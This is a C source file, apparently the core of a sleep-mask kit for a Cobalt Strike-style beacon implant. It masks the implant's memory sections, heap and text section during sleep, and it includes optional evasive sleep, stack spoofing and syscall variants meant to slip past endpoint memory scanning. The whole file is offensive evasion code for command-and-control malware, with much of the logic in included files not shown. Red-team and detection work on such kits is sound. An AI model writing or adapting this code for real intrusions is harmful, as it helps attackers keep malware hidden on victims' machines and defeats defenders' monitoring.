
#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "sleepmask.h"

void base_location() { /* used to get the base location of the sleep mask code */ }

/* Enable or Disable sleep mask capabilities */
/* LOG_SLEEPMASK_PARMS information:
 *   This determines if debug information is returned to the beacon console on
 *   the initial checkin.
 *
 *   Note: Only works when the http-post.client.output uses the print termination
 *         statement in the profile.
 */
#define LOG_SLEEPMASK_PARMS 0

/* EVASIVE_SLEEP information:
 *   Depending on how large your sleep mask code/data becomes you may need to modify
 *   the ImageSize and Img.Length variables in evasive_sleep.c in order to fully
 *   mask the sleep mask BOF memory.
 *
 *   EVASIVE_SLEEP is not supported on x86.
 */
#if _WIN64
#define EVASIVE_SLEEP 0
#endif


/* Include the source code for sleep mask capabilities */
#include "common_mask.c"

/* MASK_TEXT_SECTION information:
 *   This determines if the text section of beacon should be masked when sleeping.
 *   It is recommended to set the stage.userwx profile setting to false.
 *   This capability will modifying the memory protection and mask/unmask the
 *   text section of beacon.
 */
#if MASK_TEXT_SECTION

   /* USE_SYSCALLS information:
    *   USE_SYSCALLS is only used by the MASK_TEXT_SECTION code.
    *   Determine which system call method should be included.
    */
   #if USE_SYSCALLS
      #ifdef SYSCALLS_embedded
      #include "syscalls_embedded.c"
      #endif

      #ifdef SYSCALLS_indirect
      #include "syscalls_indirect.c"
      #endif

      #ifdef SYSCALLS_indirect_randomized
      #include "syscalls_indirect_randomized.c"
      #endif
   #endif

   #include "mask_text_section.c"
#endif

#if LOG_SLEEPMASK_PARMS
#include "log_sleepmask_parms.c"
#endif

#if EVASIVE_SLEEP
#include "evasive_sleep.c"
// #include "evasive_sleep_stack_spoof.c"
#endif

#if IMPL_CHKSTK_MS
void ___chkstk_ms() {}
#endif

/* do not change the sleep_mask function parameters */
void sleep_mask(SLEEPMASKP * parms, void(__stdcall *pSleep)(DWORD), DWORD time) {

#if MASK_TEXT_SECTION
   setup_text_section(parms);
#endif

#if LOG_SLEEPMASK_PARMS
   log_parms(parms);
#endif

   /* Mask the beacons sections and heap memory */
   mask_sections(parms);
   mask_heap(parms);

#if MASK_TEXT_SECTION
   mask_text_section(parms);
#endif

#if EVASIVE_SLEEP
   evasive_sleep(parms->mask, time);
#else
#if USE_WaitForSingleObject
   WaitForSingleObject(GetCurrentProcess(), time);
#else
   pSleep(time);
#endif
#endif

#if MASK_TEXT_SECTION
   unmask_text_section(parms);
#endif

   /* Call the masking functions again in reverse order to unmask the heap and sections */
   mask_heap(parms);
   mask_sections(parms);
}
